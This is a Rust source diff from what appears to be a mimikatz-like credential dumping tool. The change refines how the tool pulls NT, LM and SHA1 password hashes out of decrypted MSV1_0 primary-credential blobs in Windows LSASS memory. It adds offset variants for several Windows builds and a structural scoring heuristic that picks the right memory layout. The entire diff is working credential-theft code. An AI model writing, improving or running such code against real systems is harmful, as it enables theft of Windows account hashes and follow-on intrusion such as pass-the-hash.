@@ -51,20 +51,33 @@ struct PrimaryCredOffsets {
 }
 
 // MSV1_0_PRIMARY_CREDENTIAL offsets (decrypted blob).
-// Multiple offset sets for different Windows builds:
+// Multiple offset sets for different Windows builds.
+// Ordered by likelihood — canonical mimikatz structures first, empirical fallbacks last.
+//
+// KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607 (Win10 1607+ / Win11):
+//   +0x00: LogonDomainName (UNICODE_STRING, 16B)
+//   +0x10: UserName (UNICODE_STRING, 16B)
+//   +0x20: pNtlmCredIsoInProc (PTR, 8B)
+//   +0x28: isIso(1) isNtOwf(1) isLmOwf(1) isShaOwf(1) isDPAPIProtected(1) align(3)
+//   +0x30: unk0 (DWORD), +0x34: unk1 (WORD)
+//   +0x36: NtOwfPassword(16), +0x46: LmOwfPassword(16), +0x56: ShaOwPassword(20)
 const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
-    // Variant 0: Windows 10 22H2 (build 19045) - empirically verified
-    PrimaryCredOffsets { nt_hash: 0x4A, lm_hash: 0x5A, sha1_hash: 0x6A },
-    // Variant 1: Win10 1607+ (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607)
-    PrimaryCredOffsets { nt_hash: 0x4C, lm_hash: 0x5C, sha1_hash: 0x6C },
-    // Variant 2: Win10 1607+ larger DPAPIProtected alignment
-    PrimaryCredOffsets { nt_hash: 0x50, lm_hash: 0x60, sha1_hash: 0x70 },
-    // Variant 3: Win10 1507/1511 (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_OLD)
+    // Variant 0: Win10 1607+ / Win11 (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607)
+    // Canonical mimikatz layout: unk0(4)+unk1(2) before hashes
+    PrimaryCredOffsets { nt_hash: 0x36, lm_hash: 0x46, sha1_hash: 0x56 },
+    // Variant 1: Win10 1507/1511 (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_OLD)
     // isIso(1)+isNtOwf(1)+isLmOwf(1)+isSha(1)+align(4) = 8 bytes at +0x20 → hashes at +0x28
     PrimaryCredOffsets { nt_hash: 0x28, lm_hash: 0x38, sha1_hash: 0x48 },
-    // Variant 4: Win7 SP1 / Win8 / Win8.1 / Server 2008R2-2012R2
+    // Variant 2: Win7 SP1 / Win8 / Win8.1 / Server 2008R2-2012R2
     // No isIso, no DPAPIProtected. Hashes directly after UserName.
     PrimaryCredOffsets { nt_hash: 0x20, lm_hash: 0x30, sha1_hash: 0x40 },
+    // Variant 3: Win10 1607+ without unk0/unk1 (some builds or Credential Guard configs)
+    PrimaryCredOffsets { nt_hash: 0x30, lm_hash: 0x40, sha1_hash: 0x50 },
+    // Variant 4: Empirical — observed on ESXi Win10 NAS and some Server 2016 VMs.
+    // Structure may have extra fields or different alignment.
+    PrimaryCredOffsets { nt_hash: 0x4A, lm_hash: 0x5A, sha1_hash: 0x6A },
+    // Variant 5: Empirical — slight alignment variation of variant 4.
+    PrimaryCredOffsets { nt_hash: 0x4C, lm_hash: 0x5C, sha1_hash: 0x6C },
 ];
 
 /// Extract MSV1_0 sessions (always) and credentials (when available) from msv1_0.dll.
@@ -1100,12 +1113,14 @@ fn extract_primary_credential(
     }
 
     // Try each offset variant and pick the one that makes sense.
-    // Validation strategy:
+    // Validation strategy (ranked by confidence):
     //   1. SHA1(NT) == SHA1 field → strongest confirmation, accept immediately
-    //   2. SHA1 field is zero but NT looks like a hash (not ASCII text) → accept
-    //   3. If no variant passes, return error (don't guess)
+    //   2. Structural flag validation + entropy → strong (checks isNtOwf boolean flags)
+    //   3. NT passes entropy → fallback, take first passing variant
+    //   4. If no variant passes, return error (don't guess)
     let mut best_result: Option<RawPrimaryCred> = None;
-    let mut best_entropy_result: Option<(usize, RawPrimaryCred)> = None;
+    // Entropy candidates: (variant_index, struct_score, cred)
+    let mut entropy_candidates: Vec<(usize, u32, RawPrimaryCred)> = Vec::new();
 
     for (vi, offsets) in PRIMARY_CRED_OFFSET_VARIANTS.iter().enumerate() {
         let nt_off = offsets.nt_hash as usize;
@@ -1138,30 +1153,30 @@ fn extract_primary_credential(
             break;
         }
 
-        // SHA1 field is zero but NT hash looks valid: on some builds (Win7/2012)
-        // the SHA1 field may not be stored. Accept if NT hash has hash-like entropy
-        // (reject if it contains UTF-16 text patterns like 0x00 every other byte).
-        if sha1_hash == [0u8; 20] && looks_like_hash(&nt_hash) {
-            if best_entropy_result.is_none() {
-                log::info!(
-                    "  Candidate primary cred offset variant {} (nt=0x{:x}) [SHA1 not stored, entropy ok]",
-                    vi, offsets.nt_hash
-                );
-                // Compute SHA1 ourselves since it wasn't stored
-                let computed_sha1 = sha1_digest(&nt_hash);
-                best_entropy_result = Some((vi, RawPrimaryCred { lm_hash, nt_hash, sha1_hash: computed_sha1 }));
-            }
+        // SHA1 field doesn't match — collect as entropy candidate if NT looks hash-like.
+        if looks_like_hash(&nt_hash) {
+            // Score structural plausibility of this variant by checking boolean flag area
+            let struct_score = structural_score(&decrypted, offsets);
+            log::info!(
+                "  Candidate primary cred offset variant {} (nt=0x{:x}) [entropy ok, SHA1 mismatch, struct_score={}]",
+                vi, offsets.nt_hash, struct_score
+            );
+            let computed_sha1 = sha1_digest(&nt_hash);
+            entropy_candidates.push((vi, struct_score, RawPrimaryCred { lm_hash, nt_hash, sha1_hash: computed_sha1 }));
         }
     }
 
-    // Use SHA1-validated result, or entropy-based result
-    if best_result.is_none() {
-        if let Some((vi, cred)) = best_entropy_result {
-            log::info!(
-                "  Using primary cred offset variant {} [entropy-based, SHA1 computed]", vi
-            );
-            best_result = Some(cred);
-        }
+    // Use SHA1-validated result, or best entropy-based result.
+    // Among entropy candidates, prefer those with higher structural scores (boolean flag validation).
+    if best_result.is_none() && !entropy_candidates.is_empty() {
+        // Sort by struct_score descending, then by variant index ascending (canonical first)
+        entropy_candidates.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
+        let (vi, score, _) = &entropy_candidates[0];
+        log::info!(
+            "  Using primary cred offset variant {} [entropy-based, SHA1 computed, struct_score={}]",
+            vi, score
+        );
+        best_result = Some(entropy_candidates.swap_remove(0).2);
     }
 
     best_result.ok_or_else(|| {
@@ -1169,6 +1184,97 @@ fn extract_primary_credential(
             "No offset variant matched (SHA1 cross-validation and entropy check both failed)".to_string(),
         )
     })
+}
+
+/// Score structural plausibility of a PRIMARY_CREDENTIAL offset variant.
+/// Checks boolean flag area, DPAPI layout detection, and LM-zero heuristic.
+/// Higher score = more structurally plausible.
+///
+/// Key insight: Win10 1607+ with isDPAPIProtected stores a 20-byte SHA/DPAPI
+/// field at +0x36 BEFORE the actual hashes, shifting NT to +0x4A.
+/// Detected by: data at 0x36 matching first 16B of data at 0x6A.
+fn structural_score(blob: &[u8], offsets: &PrimaryCredOffsets) -> u32 {
+    let nt_off = offsets.nt_hash as usize;
+    let lm_off = offsets.lm_hash as usize;
+    let mut score = 0u32;
+
+    // Check if this blob has the DPAPI-shifted layout (NT at 0x4A instead of 0x36).
+    // When isDPAPIProtected=1, a 20B SHA/DPAPI value appears at 0x36, duplicating
+    // the value at 0x6A. When isDPAPIProtected=0, 0x36 is all zeros but NT is
+    // still at 0x4A. In both cases, the canonical 0x36 offset reads SHA/DPAPI data
+    // or zeros — NOT the real NT hash.
+    let dpapi_shifted = if blob.len() >= 0x7E {
+        let at_36 = &blob[0x36..0x4A]; // 20 bytes
+        let at_6a = &blob[0x6A..0x7E]; // 20 bytes
+        // DPAPI layout: data at 0x36 matches data at 0x6A (both non-zero),
+        // OR 0x36 is all zeros AND 0x6A is non-zero (isDPAPIProtected=0 variant)
+        let both_match = at_36 == at_6a && at_36 != &[0u8; 20];
+        let zeros_at_36 = at_36 == &[0u8; 20] && at_6a != &[0u8; 20];
+        both_match || zeros_at_36
+    } else {
+        false
+    };
+
+    match nt_off {
+        // Win10 1607+ canonical (NT at 0x36) — ONLY valid when NOT DPAPI-shifted
+        0x36 if blob.len() >= 0x36 => {
+            if dpapi_shifted {
+                // Data at 0x36 is SHA/DPAPI material, NOT the NT hash → invalidate
+                return 0;
+            }
+            let flags = &blob[0x28..0x2D];
+            let all_bool = flags.iter().all(|&b| b <= 1);
+            if all_bool {
+                score += 10;
+                if blob[0x29] == 1 { score += 5; }
+            }
+        }
+        // Win10 1507/1511
+        0x28 if blob.len() >= 0x28 => {
+            let flags = &blob[0x20..0x24];
+            let all_bool = flags.iter().all(|&b| b <= 1);
+            if all_bool {
+                score += 10;
+                if blob[0x21] == 1 { score += 5; }
+            }
+        }
+        // Win7/Win8: no flags before hashes
+        0x20 if blob.len() >= 0x20 => {
+            score += 3;
+        }
+        // Win10 1607+ without unk0/unk1
+        0x30 if blob.len() >= 0x30 => {
+            if dpapi_shifted { return 0; } // Same DPAPI issue
+            let flags = &blob[0x28..0x2D];
+            let all_bool = flags.iter().all(|&b| b <= 1);
+            if all_bool {
+                score += 8;
+                if blob[0x29] == 1 { score += 3; }
+            }
+        }
+        // Win10 1607+ DPAPI-shifted layout (NT at 0x4A)
+        0x4A => {
+            if dpapi_shifted {
+                // DPAPI layout confirmed: validate flags and boost score
+                if blob.len() >= 0x2D {
+                    let flags = &blob[0x28..0x2D];
+                    let all_bool = flags.iter().all(|&b| b <= 1);
+                    if all_bool {
+                        score += 15; // Strong structural match
+                        if blob[0x29] == 1 { score += 5; }
+                    }
+                }
+            }
+            // Also check: LM at 0x5A should be all zeros on modern Windows
+            if blob.len() >= lm_off + 16 {
+                let lm = &blob[lm_off..lm_off + 16];
+                if lm == &[0u8; 16] { score += 3; }
+            }
+        }
+        _ => {}
+    }
+
+    score
 }
 
 /// Check if 16 bytes look like a hash rather than UTF-16 text or structured data.
